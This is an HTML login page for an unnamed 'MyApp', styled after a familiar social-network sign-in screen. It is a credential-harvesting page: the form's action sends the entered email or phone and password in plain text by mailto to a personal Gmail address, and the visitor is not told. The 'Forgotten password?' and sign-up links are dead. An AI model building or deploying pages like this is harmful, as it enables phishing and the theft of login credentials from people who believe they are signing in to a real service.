<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - MyApp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            width: 100%;
            max-width: 360px;
            background: #ffffff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            padding: 20px;
            text-align: center;
        }

        .login-form h1 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }

        .login-form input {
            width: calc(100% - 20px);
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }

        .login-form button {
            width: calc(100% - 20px);
            padding: 10px;
            background-color: #1877f2;
            border: none;
            border-radius: 5px;
            color: #ffffff;
            font-size: 16px;
            cursor: pointer;
        }

        .login-form button:hover {
            background-color: #155bce;
        }

        .links {
            margin-top: 20px;
        }

        .links a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <h1>Login</h1>
            <form id="loginForm" action="mailto:kiho51412@gmail.com" method="post" enctype="text/plain">
                <input type="text" id="username" name="username" placeholder="Email or Phone" required><br>
                <input type="password" id="password" name="password" placeholder="Password" required><br>
                <button type="submit">Log In</button>
            </form>
            <div class="links">
                <a href="#">Forgotten password?</a><br>
                <a href="#">Sign Up for MyApp</a>
            </div>
        </div>
    </div>
</body>
</html>
